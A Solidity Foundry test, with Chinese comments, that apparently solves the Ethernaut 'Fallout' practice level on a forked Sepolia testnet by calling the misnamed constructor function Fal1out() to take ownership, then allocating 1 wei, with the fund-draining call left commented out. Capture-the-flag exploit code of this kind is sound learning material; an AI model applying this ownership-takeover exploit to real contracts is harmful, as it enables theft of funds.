pragma solidity ^0.8.19;

import "../lib/forge-std/src/Test.sol";

interface IFallout {
    function Fal1out() external payable;
    function collectAllocations() external;
    function allocate() external payable;
    function owner() external view returns (address);
    function allocatorBalance(address allocator) external view returns (uint256);
}

contract FallOutTest is Test {
    IFallout private level_2 = IFallout(0xc470bB761a4520B09D3795b383690b94553211AE);
    address payable private me = payable(address(this));

    function setUp() public {
        // 让本地测试环境拥有和真实测试网一模一样的状态
        vm.createSelectFork("sepolia");
    }

    function test_Level_2() public {
        console.log(unicode"账户初始余额为：", me.balance);
        level_2.Fal1out();
        assertEq(level_2.owner(), me, unicode"夺权失败");
        level_2.allocate{value: 1 wei}();
        console.log(unicode"我的合约余额为：", level_2.allocatorBalance(me));
        // level_2.collectAllocations();
        // require(address(level_2).balance == 0,unicode"转账失败，请检查！") ;
        // console.log(unicode"账户现在的余额为：",me.balance);
    }
}

